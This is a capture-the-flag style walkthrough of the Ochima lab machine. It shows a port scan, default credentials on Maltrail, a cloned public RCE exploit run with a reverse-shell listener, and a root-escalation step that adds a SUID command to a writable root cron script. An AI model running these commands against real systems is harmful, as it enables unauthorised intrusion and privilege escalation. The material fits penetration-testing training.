---
icon: ubuntu
---

# Ochima - Intermediate

## <mark style="color:blue;">Gaining Access</mark>

Nmap scan:

```
# Nmap TCP
nmap -A -T4 -p- -Pn 192.168.161.32 -oN scans/nmap-tcpall
Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-01 14:41 EDT
Nmap scan report for 192.168.161.32
Host is up (0.039s latency).
Not shown: 65532 filtered tcp ports (no-response)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 b9:bc:8f:01:3f:85:5d:f9:5c:d9:fb:b6:15:a0:1e:74 (ECDSA)
|_  256 53:d9:7f:3d:22:8a:fd:57:98:fe:6b:1a:4c:ac:79:67 (ED25519)
80/tcp   open  http    Apache httpd 2.4.52 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.52 (Ubuntu)
8338/tcp open  http    Python http.server 3.5 - 3.10
|_http-server-header: Maltrail/0.52
|_http-title: Maltrail
| http-robots.txt: 1 disallowed entry 
|_/
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose|router
Running (JUST GUESSING): Linux 4.X|5.X|2.6.X|3.X (97%), MikroTik RouterOS 7.X (97%)
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3 cpe:/o:linux:linux_kernel:2.6 cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:6.0
Aggressive OS guesses: Linux 4.15 - 5.19 (97%), Linux 5.0 - 5.14 (97%), MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3) (97%), Linux 2.6.32 - 3.13 (91%), Linux 3.10 - 4.11 (91%), Linux 3.2 - 4.14 (91%), Linux 3.4 - 3.10 (91%), Linux 4.15 (91%), Linux 2.6.32 - 3.10 (91%), Linux 4.19 - 5.15 (91%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 4 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 80/tcp)
HOP RTT      ADDRESS
1   59.20 ms 192.168.45.1
2   59.20 ms 192.168.45.254
3   59.22 ms 192.168.251.1
4   59.23 ms 192.168.161.32
```

### <mark style="color:$primary;">HTTP Port 8338 TCP</mark>

<figure><img src="../../.gitbook/assets/image (985).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (986).png" alt=""><figcaption></figcaption></figure>

Maltrail delivers us a version on the bottom page as soon as we visit the main site. A quick search for default credentials we find them and they work!

<figure><img src="../../.gitbook/assets/image (987).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (988).png" alt=""><figcaption></figcaption></figure>

A quick google search actually shows us an unathenticated rce on github for ver 0.5.3 it might work here as well: [**Github-exploit**](https://github.com/spookier/Maltrail-v0.53-Exploit)

```
git clone https://github.com/spookier/Maltrail-v0.53-Exploit
```

Make sure you have a listener ready before running the exploit

```
python3 exploit.py 192.168.45.158 80 http://192.168.161.32:8338/
```

<figure><img src="../../.gitbook/assets/image (989).png" alt=""><figcaption></figcaption></figure>

We got a shell as snort!

## <mark style="color:blue;">Privilege Escalation</mark>

<figure><img src="../../.gitbook/assets/image (992).png" alt=""><figcaption></figcaption></figure>

I don't see any other users besides snort and root, gonna look for some config files.

<figure><img src="../../.gitbook/assets/image (990).png" alt=""><figcaption></figcaption></figure>

```
cat maltrail.conf
```

<figure><img src="../../.gitbook/assets/image (991).png" alt=""><figcaption></figcaption></figure>

Reveals the same creds we found online

In snort home directory I found a file owned by root

<figure><img src="../../.gitbook/assets/image (993).png" alt=""><figcaption></figcaption></figure>

### <mark style="color:$primary;">PSPY</mark>

Pspy reveals a cron script running as root (UID=0) let's checkt it out

<figure><img src="../../.gitbook/assets/image (994).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (995).png" alt=""><figcaption></figcaption></figure>

The script is owned by root but we have read and write permissions

Let's make it set the SUID of /bin/bash so we can elevate to the root user

We are going to just append it to the end of the script, and wait for root to execute it

```
echo -e 'chmod +s /bin/bash' >> etc_Backup.sh
```

<figure><img src="../../.gitbook/assets/image (997).png" alt=""><figcaption></figcaption></figure>

Now to elevate to the root user:

<figure><img src="../../.gitbook/assets/image (998).png" alt=""><figcaption></figcaption></figure>
